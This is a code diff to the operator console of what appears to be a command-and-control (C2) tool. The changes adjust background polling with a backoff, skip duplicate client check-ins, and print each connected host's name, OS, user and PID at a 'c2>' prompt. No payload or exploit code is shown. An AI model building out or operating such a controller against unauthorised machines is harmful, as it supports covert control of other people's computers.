@@ -155,16 +155,23 @@ class Operator:
             results = self.poll_result_once()
             if results:
                 for seq_num, result in sorted(results.items()):
+                    print()
                     self._display_result(seq_num, result)
+                    print("c2> ", end='', flush=True)
         except Exception:
             pass
 
     def _background_poller(self):
         """Background thread that polls for checkins/results."""
+        interval = 20
         while self._polling:
-            time.sleep(15)
-            if self._polling:
-                self._check_for_checkins()
+            time.sleep(interval)
+            if not self._polling:
+                break
+            self._check_for_checkins()
+            # Gradual backoff to avoid rate limits (max 60s)
+            if interval < 60:
+                interval += 5
 
     def interactive(self):
         """Run the interactive operator console."""
@@ -190,8 +197,6 @@ class Operator:
                 break
 
             if not line:
-                # On empty input (just Enter), check for checkins
-                self._check_for_checkins()
                 continue
 
             parts = line.split(None, 1)
@@ -249,17 +254,26 @@ class Operator:
         except json.JSONDecodeError:
             info = {}
         client_id = info.get('client_id', '????????')
+
+        # Skip if already known
+        if client_id in self.connected_clients:
+            return
+
         hostname = info.get('hostname', 'unknown')
         os_info = info.get('os', 'unknown')
-        ts = result.get('ts', time.time())
-        timestamp = time.strftime(
-            '%Y-%m-%d %H:%M:%S', time.localtime(ts)
-        )
+        user = info.get('user', 'unknown')
+        ts = result.get('ts', 0)
+        if ts > 0:
+            timestamp = time.strftime(
+                '%Y-%m-%d %H:%M:%S', time.localtime(ts)
+            )
+        else:
+            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
         self.connected_clients[client_id] = {
             'hostname': hostname,
             'os': os_info,
             'connected_at': timestamp,
-            'user': info.get('user', 'unknown'),
+            'user': user,
             'pid': info.get('pid', '?'),
         }
         print(
@@ -267,7 +281,9 @@ class Operator:
             f"\n    client_id : {client_id}"
             f"\n    hostname  : {hostname}"
             f"\n    os        : {os_info}"
+            f"\n    user      : {user}"
             f"\n    timestamp : {timestamp}\n"
+            f"c2> ", end='', flush=True
         )
 
     def _display_result(self, seq: int, result: dict):
